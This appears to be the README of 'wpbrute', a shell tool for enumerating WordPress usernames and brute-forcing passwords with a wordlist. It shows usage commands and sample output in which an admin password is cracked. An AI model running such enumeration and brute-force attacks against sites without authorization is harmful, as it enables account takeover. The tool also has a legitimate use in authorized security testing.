wpbrute
=======

Wordpress user enumeration and password bruteforce.

<b>User Enumeration:</b>

<code>$ ./wpbrute.sh --url=www.example.com</code>

<code>[+] Username or nickname enumeration</code>

<code>admin</code>

<code>testuser</code>

<b>Password Bruteforce:</b>

<code> ./wpbrute.sh --url=www.example.com --user=admin --wordlist=wordlist.txt</code>

<code>[+] Bruteforcing user [admin]</code>

<code>123456</code>

<code>test123</code>

<code>123test123</code>

<code>The password is: 123test123</code>
